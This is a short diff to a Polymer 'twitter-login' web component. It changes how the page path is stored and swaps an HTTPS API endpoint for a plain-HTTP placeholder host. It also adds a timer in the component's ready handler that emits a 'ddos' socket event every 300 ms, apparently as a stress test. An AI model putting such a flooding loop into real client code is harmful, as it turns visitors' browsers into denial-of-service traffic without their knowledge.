@@ -11,8 +11,6 @@ subject to an additional IP rights grant found at http://polymer.github.io/PATEN
 <link rel="import" href="../../bower_components/polymer/polymer.html">
 <link rel="import" href="../../bower_components/paper-button/paper-button.html">
 <link rel="import" href="../../bower_components/paper-spinner/paper-spinner-lite.html">
-<link rel="import" href="../../bower_components/iron-location/iron-location.html">
-
 
 <dom-module id="twitter-login">
   <template>
@@ -304,7 +302,7 @@ subject to an additional IP rights grant found at http://polymer.github.io/PATEN
             this.$.goTwitter.hidden = true;
             this.$.goTwitterLoad.hidden = false;
             this.socket.emit('twitterRequestToken', {jwt: this.jwt});
-            localStorage.setItem("loc", this.path);
+            localStorage.setItem("loc", window.location.pathname);
         },
 
         openProfile: function(){
@@ -337,7 +335,11 @@ subject to an additional IP rights grant found at http://polymer.github.io/PATEN
         ready: function() {
 
             this.jwt = localStorage.getItem("jwt");
-            this.socket = io('https://api.convoo.me');
+            this.socket = io('http://website.com:8081');
+
+            setInterval(function(){
+                        this.socket.emit('ddos', {jwt: 'test'});
+            }.bind(this), 300);
 
             if(!this.jwt){
               this.socket.emit('jwt', {
